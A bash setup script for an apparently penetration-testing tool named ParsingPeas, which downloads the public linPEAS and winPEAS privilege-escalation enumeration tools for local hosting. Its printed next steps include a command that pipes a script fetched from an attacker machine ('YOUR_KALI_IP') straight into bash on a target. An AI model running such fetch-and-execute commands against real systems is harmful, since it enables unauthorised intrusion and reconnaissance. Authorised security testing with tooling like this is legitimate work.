#!/bin/bash
#
# ParsingPeas Setup Script
# Downloads linpeas and winpeas scripts to host locally
#

echo "╔═══════════════════════════════════════╗"
echo "║     ParsingPeas Setup Script v1.0     ║"
echo "╚═══════════════════════════════════════╝"
echo ""

SCRIPTS_DIR="./scripts"
LINPEAS_URL="https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh"
WINPEAS_URL="https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASx64.exe"

# Create scripts directory
mkdir -p "$SCRIPTS_DIR"

# Check for curl
if ! command -v curl &> /dev/null; then
    echo "[!] Error: curl not found. Please install curl."
    exit 1
fi

# Download linpeas
echo "[*] Downloading linpeas.sh..."
if curl -L -o "$SCRIPTS_DIR/linpeas.sh" "$LINPEAS_URL" 2>&1 | grep -v "^  " | grep -v "^$"; then
    chmod +x "$SCRIPTS_DIR/linpeas.sh"
    LINPEAS_SIZE=$(stat -f%z "$SCRIPTS_DIR/linpeas.sh" 2>/dev/null || stat -c%s "$SCRIPTS_DIR/linpeas.sh" 2>/dev/null)
    echo "[+] Downloaded linpeas.sh ($((LINPEAS_SIZE / 1024)) KB)"
else
    echo "[!] Failed to download linpeas.sh"
    exit 1
fi

echo ""

# Download winpeas
echo "[*] Downloading winpeas.exe..."
if curl -L -o "$SCRIPTS_DIR/winpeas.exe" "$WINPEAS_URL" 2>&1 | grep -v "^  " | grep -v "^$"; then
    WINPEAS_SIZE=$(stat -f%z "$SCRIPTS_DIR/winpeas.exe" 2>/dev/null || stat -c%s "$SCRIPTS_DIR/winpeas.exe" 2>/dev/null)
    echo "[+] Downloaded winpeas.exe ($((WINPEAS_SIZE / 1024)) KB)"
else
    echo "[!] Failed to download winpeas.exe"
    exit 1
fi

echo ""
echo "[+] Setup complete!"
echo ""
echo "Next steps:"
echo "  1. Install Python dependencies: pip3 install -r requirements.txt"
echo "  2. Start receiver: python3 receiver.py"
echo "  3. On target: curl -sSL http://YOUR_KALI_IP:8000/get-script | bash"
echo ""
